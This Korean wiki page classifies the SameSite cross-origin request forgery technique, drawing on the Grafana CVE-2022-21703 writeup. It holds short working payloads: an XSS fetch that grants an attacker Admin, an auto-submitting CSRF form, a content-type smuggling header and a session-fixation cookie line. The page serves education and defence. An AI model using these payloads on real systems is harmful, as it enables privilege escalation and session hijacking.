---
title: Same-Site_Cross-Origin_Request_Forgery
description: 
published: true
date: 2025-07-31T14:48:15.486Z
tags: csrf & samesite policy bypass, attack success validation, data exfiltration, cross‑site scripting (xss), subdomain takeover, html injection, cross‑site request forgery (csrf), content‑type smuggling, privilege escalation via csrf, session fixation
editor: markdown
dateCreated: 2025-07-20T11:54:53.516Z
---

# SameSite Cross-Origin Request Forgery

## 개요

“SameSite Cross-Origin Request Forgery”는 SameSite 쿠키 속성에 대한 브라우저의 해석 방식이 동일하지 않거나 사용자의 상호작용, 리디렉션, 요청 방식 등에 따라 달라지는 불일치를 악용한다. 서버가 쿠키에 SameSite 보호를 설정하더라도, 일부 브라우저는 특정 요청을 same-site로 잘못 판단해 cross-site 요청임에도 인증 쿠키를 함께 전송할 수 있다. 이처럼 클라이언트 보안 정책의 해석 경계가 상황에 따라 달라지면, 결과적으로 CSRF 보호 우회가 가능해진다.


## 분류

> 보안 정책 적용 불일치 (Security Policy Gap)
> → 클라이언트 보안 정책 불일치 (Client-Side Security Policy Mismatch)
> → Same-Site Cross-Origin Request Forgery

## 절차

| Phase          | Description                                                                                                                              |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| Reconnaissance | 공격자는 하위 도메인 목록을 수집하고 XSS, HTML, Subdomain Takeover와 같은 취약점을 찾는다. 대상 서비스가 SameSite 쿠키에 의존해서 CSRF를 막고 있다는 사실과, 변조하고 싶은 상태, 변경 엔드포인트를 식별한다. |
| Injection      | 악성 HTML/JS를 삽입하여 공격 페이지가 cross-origin same-site로 요청을 보낼 수 있도록 도메인 관계를 설계한다. (foo.example.org → bar.example.org 등)                        |
| Bypass         | SameSite 속성은 교차Site 요청만 차단하므로, 공격자가 만든 교차Origin + 동일Site 요청엔 적용되지 않는다. 브라우저는 인증 쿠키를 첨부해 서버에 전달하고, ‘SameSite=Strict’ 보호를 우회한다.            |
| Validation     | 응답에 세션 쿠키, 사용자 상태가 포함되는지, 또는 Set-Cookie 헤더 유무를 관찰해서 우회 성공 여부 판단한다.                                                                       |
| Exploitation   | 세션 고정, CSRF, 권한 상승(ex> Grafana CVE-2022-21703와 유사)등을 수행한다.                                                                               |
| Exfiltration   | API 호출, 파일 다운로드 등으로 민감 정보 탈취나 외부 유출 등의 추가적인 공격을 수행한다.                                                                                    |

<div style="text-align: left;">
  <img
    src="/same-site_cross-origin_request_forgery.png"
    alt="SameSite Cross-Origin Request Forgery 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격기법

### Reconnaissance

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Subdomain Takeover</td>
      <td>
        <pre><code>dig CNAME fictioussubdomain.victim.com
(예: dig 명령을 통해 어떤 DNS 리소스 레코드가 작동하지 않고 비활성 상태인 서비스를 가리키는지 확인한다.)</code></pre>
      </td>
      <td>공격자는 대상 사이트의 서브도메인을 열거하고, DNS가 제거된(예: 미사용 클라우드 서비스) 서브도메인을 확인한다.</td>
      <td>[1], [2], [A]</td>
    </tr>
    <tr>
      <td>Cross-Site Scripting (XSS)</td>
      <td>-</td>
      <td>공격자는 서브도메인에서 스크립트 주입 취약점을 탐지하여, 해당 컨텍스트에서 악성 JavaScript 실행 권한을 획득한다.</td>
      <td>[1], [2]</td>
    </tr>
    <tr>
      <td>HTML Injection</td>
      <td>-</td>
      <td>공격자는 임의의 HTML 삽입을 허용하는 취약점을 찾아낸다.</td>
      <td>[2]</td>
    </tr>
  </tbody>
</table>

### Injection

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Subdomain Takeover (Malicious Content)</td>
      <td>
        <pre><code>http.Handle("/", http.FileServer(http.Dir(".")))
http.ListenAndServe(":8081", nil)
Grafana PoC의 경우, Go의 http.FileServer로 정적 CSRF 페이지를 same-site로 호스팅한다.</code></pre>
      </td>
      <td>취약 서브도메인 제어 후, 해당 도메인에 악성 페이지/스크립트를 호스팅한다.</td>
      <td>[1], [2]</td>
    </tr>
    <tr>
      <td>XSS Payload Injection</td>
      <td>
        <pre><code>&lt;script&gt;
  fetch("/api/org/invites", {
    method: "POST",
    mode: "no-cors",
    credentials: "include",
    body: JSON.stringify({ name: "attacker", role: "Admin" })
  });
&lt;/script&gt;</code></pre>
      </td>
      <td>Same-Site 환경에서 no-cors, include 옵션을 사용해 /api/org/invites에 POST 요청을 보내 CSRF 보호를 우회한다. 정상 서브도메인 내 XSS 취약점을 통해 악성 스크립트를 주입한다.</td>
      <td>[1], [2]</td>
    </tr>
    <tr>
      <td>Auto-Submitting HTML Form</td>
      <td>
        <pre><code>&lt;form action="http://localhost:3000/api/org/invites" method="POST"&gt;
  &lt;input name="name" value="attacker"&gt;
  &lt;input name="loginOrEmail" value="attacker@example.com"&gt;
  &lt;input name="role" value="Admin"&gt;
  &lt;input name="sendEmail" value="false"&gt;
&lt;/form&gt;</code></pre>
      </td>
      <td>Same-Site 컨텍스트에서 폼 자동 제출 스크립트와 함께 실행할 경우 피해자의 인증 쿠키가 첨부된 채 CSRF 공격이 수행된다. 공격자의 페이지에 자동 제출되는 폼을 삽입·호스팅한다. 피해자의 브라우저는 자신의 쿠키를 포함해 해당 엔드포인트로 POST 요청을 수행한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Bypass

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>SameSite Cookie Bypass</td>
      <td>
        <pre><code>fetch("/api/org/invites", {
  method: "POST",
  mode: "no-cors",
  credentials: "include"
  ...
});</code></pre>
      </td>
      <td>동일 사이트 컨텍스트(예: 서브도메인)에서 요청하면 브라우저가 이를 1st-party 요청으로 처리하여 Strict/Lax 쿠키까지 모두 첨부한다. SameSite 속성이 Cross-Site 요청만 차단함을 악용하여, CSRF 보호를 우회한다.</td>
      <td>[1], [2]</td>
    </tr>
    <tr>
      <td>Content-Type Smuggling</td>
      <td>
        <pre><code>fetch("/api/org/invites", {
  ...
  headers: { "Content-Type": "text/plain;application/json" },
  body: JSON.stringify({ name: "attacker", … })
});</code></pre>
      </td>
      <td>Grafana Poc의 경우 이 기법으로 추가적인 CORS preflight 없이 검증을 통과한다. CORS가 안전하다고 여기는 기본 타입(예: text/palin)을 사용하고, 매개변수에 application/json을 추가해, 브라우저의 사전 요청 검사 없이 서버의 JSON 검증을 통과시킨다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Validation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Response/State Inspection</td>
      <td>
        <pre><code>(예: 서버의 200 OK 응답을 통해 SameSite 우회를 검증한다.)</code></pre>
      </td>
      <td>조작된 요청의 응답 또는 시스템 상태 변화를 확인한다.</td>
      <td>[1], [2]</td>
    </tr>
  </tbody>
</table>

### Exploitation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Cross-Site Request Forgery (CSRF)</td>
      <td>
        <pre><code>(예: Grafana의 경우 GET/POST API 전역이 공격 표면으로 노출되었다.)</code></pre>
      </td>
      <td>SameSite 우회 후, 피해자를 가장해 상태 변경 요청을 위조한다. 설정 변경, 트랜잭션 실행 등 모든 취약 엔드포인트가 대상이 될 수 있다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Privilege Escalation via CSRF</td>
      <td>
        <pre><code>(예: Grafana PoC의 경우 Admin 초대 요청을 전송해 권한을 상승 시켰다.)</code></pre>
      </td>
      <td>악성 요청으로 공격자는 관리자 등 높은 권한으로 초대하거나 권한 변경을 수행한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Session Fixation</td>
      <td>
        <pre><code>document.cookie = "sessionid=abc123; Domain=example.com; Path=/";</code></pre>
      </td>
      <td>피해자가 이를 수락해 인증 시 사용하면, 공격자가 세션 토큰을 획득하여 지속적인 세션 탈취가 가능하다. 서브도메인 제어 시, 공격자가 알고 있는 세션 ID를 쿠키로 설정(session fixation)한다.</td>
      <td>[B]</td>
    </tr>
  </tbody>
</table>

### Exfiltration

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Sensitive Data Exfiltration</td>
      <td>-</td>
      <td>CSRF 성공 후(높은 권한 획득 등), 공격자 제어 서브도메인에서 API를 호출해 사용자 데이터・파일을 가져온다.</td>
      <td>[B]</td>
    </tr>
  </tbody>
</table>

## 분류에 해당하는 문서

\[1] [https://jub0bs.com/posts/2022-02-08-cve-2022-21703-writeup/](https://jub0bs.com/posts/2022-02-08-cve-2022-21703-writeup/)
\[2] [https://jub0bs.com/posts/2021-01-29-great-samesite-confusion/](https://jub0bs.com/posts/2021-01-29-great-samesite-confusion/)

## 기타 참고문헌

\[A] [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/02-Configuration\_and\_Deployment\_Management\_Testing/10-Test\_for\_Subdomain\_Takeover](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover)
\[B] [https://www.hackerone.com/blog/guide-subdomain-takeovers-20](https://www.hackerone.com/blog/guide-subdomain-takeovers-20)
